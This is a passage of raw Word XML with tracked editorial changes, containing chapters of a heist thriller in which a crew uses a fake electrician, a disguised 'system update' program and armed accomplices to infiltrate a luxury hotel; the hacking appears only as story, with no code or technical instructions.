          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">dangling </w:t>
      </w:r>
      <w:r w:rsidR="001908C1">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> its open</w:t>
      </w:r>
      <w:r w:rsidR="00667E14">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> base</w:t>
      </w:r>
      <w:ins w:id="2667" w:author="TextVet" w:date="2016-03-25T14:20:00Z">
        <w:r w:rsidR="00EE011E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2668" w:author="TextVet" w:date="2016-03-25T14:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EE011E">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“…an invisibility suit.”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“Speaking of visibility,” </w:t>
      </w:r>
      <w:del w:id="2669" w:author="TextVet" w:date="2016-03-25T14:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D3712D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sa</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:ins w:id="2670" w:author="TextVet" w:date="2016-03-25T14:23:00Z">
        <w:r w:rsidR="00D3712D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>nforme</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d Mike</w:t>
      </w:r>
      <w:ins w:id="2671" w:author="TextVet" w:date="2016-03-25T14:23:00Z">
        <w:r w:rsidR="00FB00AB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2672" w:author="TextVet" w:date="2016-03-25T14:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FB00AB">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“I’ve taught Nat-Nat how to work the camera feeds. She’ll be your eyes and ears.”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Moshen’s voice chimed in. “‘Nat-Nat’? You call her ‘Nat-Nat’? What does she call you? ‘Snugglewumpus’?”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giggled. “Oooh, I like that one! My Snugglewumpus…”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cooed back, “I’ll totally be your Snugglewumpus!” They started making out on camera.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grabbed a mouse and hid their window. “Moshen,” he said, addressing the small motionless icon. “What’s your status?”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Moshen’s disembodied voice replied, “I’m parked on a side-street five miles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“Great,” Danny said. “How are you feeling? Confident? Nervous?”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said, “Um…”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a tree-lined residential road somewhere in Seattle’s eastern suburbs, a boxy gray van marked “Claymore Communications” stood on the curb. Moshen sat in the driver’s seat, his thin arms clutching the steering wheel. To his right, Sergey Mukhayev stared brooding, his hulking form breathing tensely as he gazed into the night. Behind them, Leo adjusted the suppressor on his handgun while Eugene deftly twirled a butterfly knife.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can’t complain…” Moshen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switched focus. “Tina. Status?”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She replied with a tired half-smile, “I’ve been Betty Crockering all day. I’d never eat in this house again if I were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have a job for you,” Danny said. “It’s a job you’re best prepared for out of all of us, and it’s mission-critical.”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long as it gets me out of the kitchen,” she replied. “What do you need?”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“You’re not going to like it.” He hesitated, and finally said, “Communications officer.”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does that mean?” she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“You know, like Uhura from </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="2673" w:author="TextVet" w:date="2016-03-25T14:26:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>Star Trek</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“Which means…?” she repeated.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Gallante’s phone switch plugs into a Cisco VoIP system,” Danny explained, “</w:t>
      </w:r>
      <w:ins w:id="2674" w:author="TextVet" w:date="2016-03-25T14:27:00Z">
        <w:r w:rsidR="00F84F19">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>T</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2675" w:author="TextVet" w:date="2016-03-25T14:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F84F19">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>And t</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>heir security guards have walkie-talkies that use a trunked P25 digital radio system with an RTP cross-bridge. We can route all voice traffic to a SIP user agent on your terminal…”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Which means…?</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“…You’ll be answering phones,” Danny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glared at him with a gaze so cold that her image almost began frosting the screen.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because… Your day job…” Danny stammered.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hate you so much right now,”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rumble of the yacht’s engines cut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go-time, guys,”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Behind him, Jason descended into the cabin. “The ship’s docked. Danny, try not</w:t>
      </w:r>
      <w:ins w:id="2676" w:author="TextVet" w:date="2016-03-25T14:28:00Z">
        <w:r w:rsidR="00616090">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> to</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> get killed. Come back here when you’re ready for extraction. I’ll be waiting.”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“Actually, Jason, there’s a very important task that I need you to handle.”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“What’s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same thing I did for you forty-eight hours ago. I need you to prepare a PowerPoint presentation.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>27</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Hernando Mejía spoke no English,</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> and had no papers. He wasn’t stupid; he knew to keep his head down and his mouth shut. Stoically, he rubbed a Windex-coated cloth against the interior of the windows of the lower west wing of the Medina Gallante.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saw motion outside. From the stone steps leading down to the wharf, a man’s head ascended into the light. A small Bluetooth device sat nestled in his ear, beneath a yellow safety helmet. He wore brown coveralls and a toolbelt, and carried a toolbox and a complex-looking device. He could’ve been a plumber or an electrician.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proceeded toward the doors. When he pulled on their handles, they wouldn’t budge. The man knocked on the glass, waved to Mejía, and said something in English. Mejía replied in Spanish, but the man simply shrugged.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Mejía weighed his options. His instincts told him to be wary. Paranoia was a virtue.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Paranoia, however, also told Mejía that, if this man was indeed simply a maintenance worker, refusal to let him in could result in being reported to management. And job loss. And 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Mejía opened the door.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="2677" w:author="TextVet" w:date="2016-03-28T09:49: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glided in, babbled something in English, and walked off into the wide wood and marble halls of the hotel. Mejía returned to work.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002662C5" w:rsidRPr="000D3488" w:rsidRDefault="002662C5" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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Lynnette Leffert was swamped.</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> The clientele of </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Bistro</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> was awash with cash and never thought twice about paying extravagant prices for a garden salad and garlic bread, but they always made Leffert and her staff work for their profits. She’d spent the evening enduring culinary criticism from a Parisian couple, sexual harassment from Kuwaiti bankers, and an impenetrable language barrier from Japanese technology executives. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Even on the best of days, managing the premiere restaurant inside the Medina Gallante was not for the faint of heart.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was checking the fridge inventory when Luke, the host, came to fetch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“Hey, um, Lynette…?” said the thin young man. “We’ve got some guy from Facilities here. He says he’s found some electrical problem…?”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“Electrical problem?” she echoed, her concentration still set on counting foil-wrapped steaks.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said it might have something to do with our computer? Should I bring him over, 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Leffert shook her head. She closed the refrigerator door and marched out from the kitchen.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i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Bistro</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> opened out to a wide hallway that led to the elevators and lobby. Velvet ropes swooped out from the doorway, past a black easel listing the day’s specials in handwritten multi-colored chalk.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 electrician, evident by his blue coveralls and yellow helmet, stood waiting. He was studying the host’s lectern, where a spiral-bound notepad and a glossy, crayon-marked paper chart enabled Luke to keep track of reservations and seating arrangements.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I help you?” Leffert asked pointedly.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looked slightly disoriented. “I… was just noticing that you don’t use a computer for your, um, seating thingie…”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we don’t,” Leffert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you do have a computer,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a Point-Of-Sale system,” Leffert answered.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said, “Well, see, I’m trying to isolate a ground fault somewhere along this column of the building. I need to go through all the appliances on this circuit until I can find what’s causing the issue.”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Leffert raised an eyebrow. “A ground fault?”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 nodded. “Yes, ma’am. It’s when some appliance somewhere isn’t properly insulated. It could be very dangerous. I just need to rule out your computer as a possible source…”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Leffert rubbed her temples. “How long will it take?”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“Two minutes, tops. I just need to check the computer’s power cord.”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“Fine, get to it,” Leffert replied. “Luke, take him to the POS.”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Luke escorted the electrician to the window between the kitchen and the serving area. </w:t>
      </w:r>
      <w:ins w:id="2678" w:author="TextVet" w:date="2016-03-28T09:57:00Z">
        <w:r w:rsidR="00665855">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>O</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2679" w:author="TextVet" w:date="2016-03-28T09:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00665855">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>There, o</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n a shelf jutting from the wall</w:t>
      </w:r>
      <w:del w:id="2680" w:author="TextVet" w:date="2016-03-28T09:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00665855">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sat the restaurant’s Point-Of-Sale computer. Its touch-sensitive screen showed multicolored blocks that </w:t>
      </w:r>
      <w:del w:id="2681" w:author="TextVet" w:date="2016-03-28T09:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00665855">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">the </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>servers</w:t>
      </w:r>
      <w:del w:id="2682" w:author="TextVet" w:date="2016-03-28T09:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00665855">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> could</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> press</w:t>
      </w:r>
      <w:ins w:id="2683" w:author="TextVet" w:date="2016-03-28T09:56:00Z">
        <w:r w:rsidR="00665855">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to enter orders. The electrician nudged the computer to access its rear workings.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Leffert had scarcely gotten halfway back to the kitchen before Luke came running. “Hey, Lynette! It’s asking for your password!”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electrician stood sheepishly next to the POS computer. “I’m so sorry! I must’ve bumped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Leffert looked at the POS touch</w:t>
      </w:r>
      <w:del w:id="2684" w:author="TextVet" w:date="2016-03-28T10:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004421C9">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screen. It presented a large window with a big orange warning icon and the text:</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t>Do you want to allow the following program from an</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4400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>unknown publisher to make changes to this computer?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pP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4400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Program name: </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>MICROSOFT_WINDOWS_SYSTEM_UPDATE.EXE</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4400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Publisher: </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Unknown</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4400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">File origin: </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="004400"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Removable media on this computer</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>To continue, type an administrator password, and then click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Leffert rolled her eyes and tapped her password. “It’s just some kind of system update crap,” Leffert said. “Probably didn’t even have anything to do with you. Did you find the issue?”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shook his head. “No, the fault’s not here. Your system’s fine.”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“Good. You need anything else from me?” Leffert said with a tired shrug.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 at all,” he said, and he scampered off into the hall.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00521722" w:rsidRDefault="00521722" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="2685" w:author="TextVet" w:date="2016-03-28T10:01:00Z"/>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:smallCaps/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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Danny watched the old Claymore Communications van</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> roll through the gate toward a secluded corner of the hotel’s underground garage. He leaned against a concrete pillar, illuminated by jaundiced fluorescent lamps. “Did anyone see them enter?” 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“Negative,” Mike replied inside his earpiece. “Our virus went from the restaurant’s sale terminal to the hotel’s billing system, and from there to the security office. We control the cameras. And the garage gate, obviously.</w:t>
      </w:r>
      <w:del w:id="2686" w:author="TextVet" w:date="2016-03-28T10:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A56489">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watched the parking barrier’s arm drop back down after the van finished passing. “And the doors?”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“All ours,” Mike answered. “And the elevators. Still working on telephone landlines…” A moment later, he added, “PSTN secured! Routing all phone calls to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“Yay,” Tina said with a level of enthusiasm usually reserved for dental exams.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Moshen cut the engine, hopped out, and came around to open the rear doors of the van. Danny was greeted by the familiar sight of Claymore’s field installation equipment and on-site troubleshooting tools. A spectrum analyzer, a portable power supply, and a short Yagi antenna </w:t>
      </w:r>
      <w:ins w:id="2687" w:author="TextVet" w:date="2016-03-28T10:03:00Z">
        <w:r w:rsidR="00932FF9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>protruded</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2688" w:author="TextVet" w:date="2016-03-28T10:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00932FF9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>jutted out</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> from the </w:t>
      </w:r>
      <w:ins w:id="2689" w:author="TextVet" w:date="2016-03-28T10:04:00Z">
        <w:r w:rsidR="00242EBA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>heap</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2690" w:author="TextVet" w:date="2016-03-28T10:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00242EBA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>disheveled pile</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> of electronics. In the past six years, he’d taken this van to more trade shows and vendor demonstrations than he cared to remember. With Claymore now closed and its assets pending sell-off, this mission to the Medina Gallante was to be this van’s last expedition.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van rocked gently on its suspension as Sergey stepped out. The side door slid open, and Eugene and Leo emerged. They each fiddled with Bluetooth earbuds. On his own piece, Danny overheard the chatter as Tina joined them to the conference call.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walked away to stand watch. The three Russians came around to the back of the van and dug through the piles of cables and electronics.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Buried beneath the boxes lay a mobile armory.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Sergey extracted a vest of grayish body armor, long and bulky with hard, blocky plates. He donned it over his clothes and fastened its buckles. Onto his head he pulled a heavy-looking full-faced helmet with a thick visor. He strapped a tall black rectangular </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>shield to his left arm, large enough to cover his body from knees to face, with a wide transparent window embedded near the top to allow for vision. In his right hand</w:t>
      </w:r>
      <w:ins w:id="2691" w:author="TextVet" w:date="2016-03-28T10:06:00Z">
        <w:r w:rsidR="00C15C47">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he held a MAC-10, complete with suppressor, folding stock, laser sight, and extended magazine. He looked like a </w:t>
      </w:r>
      <w:ins w:id="2692" w:author="TextVet" w:date="2016-03-28T10:06:00Z">
        <w:r w:rsidR="00C10D04">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">two-legged </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>tank</w:t>
      </w:r>
      <w:del w:id="2693" w:author="TextVet" w:date="2016-03-28T10:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C10D04">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
